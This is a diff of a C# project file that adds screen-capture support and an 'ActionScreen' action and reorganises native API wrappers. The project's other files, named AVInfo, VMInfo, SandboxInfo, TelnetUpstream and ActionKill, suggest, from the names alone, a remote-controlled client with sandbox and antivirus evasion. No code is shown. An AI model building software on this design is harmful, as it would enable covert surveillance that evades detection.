@@ -28,6 +28,8 @@
   <ItemGroup>
     <Reference Include="System" />
     <Reference Include="System.Management" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
   </ItemGroup>
   <ItemGroup>
     <Compile Include="Properties\AssemblyInfo.cs" />
@@ -40,11 +42,6 @@
     <Compile Include="Cryptography\RSA.cs" />
     <Compile Include="Cryptography\RSABase.cs" />
     <Compile Include="IO\AltFileStream.cs" />
-    <Compile Include="Native\CreateProcess.cs" />
-    <Compile Include="Native\DeleteFileW.cs" />
-    <Compile Include="Native\CreateFileW.cs" />
-    <Compile Include="Native\CreateFile.Constants.cs" />
-    <Compile Include="Native\PathFileExists.cs" />
     <Compile Include="Internal\AVInfo.cs" />
     <Compile Include="Internal\VMInfo.cs" />
     <Compile Include="Detector.cs" />
@@ -66,10 +63,15 @@
     <Compile Include="Actions\Predefined\ActionStartArgs.cs" />
     <Compile Include="Actions\Predefined\ActionDetect.cs" />
     <Compile Include="Actions\Predefined\ActionAutoUpgrade.cs" />
-    <Compile Include="Native\GetModuleHandle.cs" />
     <Compile Include="Internal\SandboxInfo.cs" />
     <Compile Include="Actions\Predefined\ActionKill.cs" />
     <Compile Include="Networking\TelnetUpstream.cs" />
+    <Compile Include="Native\gdi32.cs" />
+    <Compile Include="Native\kernel32.cs" />
+    <Compile Include="Native\ProcessInfo.Constants.cs" />
+    <Compile Include="Native\FileInfo.Constants.cs" />
+    <Compile Include="Native\shlwapi.cs" />
+    <Compile Include="Actions\Predefined\ActionScreen.cs" />
   </ItemGroup>
   <Import Project="$(MSBuildBinPath)\Microsoft.CSharp.targets" />
   <ProjectExtensions>
